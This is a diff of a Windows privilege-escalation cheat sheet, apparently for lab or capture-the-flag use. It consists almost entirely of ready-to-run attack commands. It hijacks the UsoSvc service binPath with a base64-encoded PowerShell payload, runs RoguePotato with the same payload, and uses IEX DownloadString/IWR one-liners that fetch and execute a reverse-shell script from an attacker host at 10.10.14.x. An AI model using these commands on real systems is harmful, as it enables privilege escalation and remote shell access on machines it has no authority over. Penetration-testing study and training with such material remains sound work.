@@ -1,16 +1,22 @@
 ==============================================================================
 [+] Services
 ==============================================================================
+# List services
+sc.exe query state=all
+
+# Change path of services
 echo "IEX (IWR http://10.10.14.20:8000/Invoke-PowerShellTcp2.ps1 -UseBasicParsing)" | iconv -t utf-16le |base64 -w 0
 sc.exe config usosvc binPath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADAAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwADIALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="
 sc.exe qc UsoSvc
 sc.exe start UsoSvc
 sc.exe stop UsoSvc
+
 ==============================================================================
 [+] RoguePotato
 ==============================================================================
 CLSID => http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/
 .\RoguePotato.exe -r 10.10.14.20 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADAAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwADIALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA==" -l 9999
+
 ==============================================================================
 [+] AutoLogon credentials 
 ==============================================================================
@@ -46,6 +52,7 @@ sudo impacket-smbserver smbFolder $(pwd) -smb2support
 ==============================================================================
 powershell.exe  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp2.ps1');
 powershell.exe  IEX (IWR http://10.10.14.28/-PowerShellTcp.ps1 -UseBasicParsing)
+
 ==============================================================================
 [+] Transfer files Certutil
 ==============================================================================
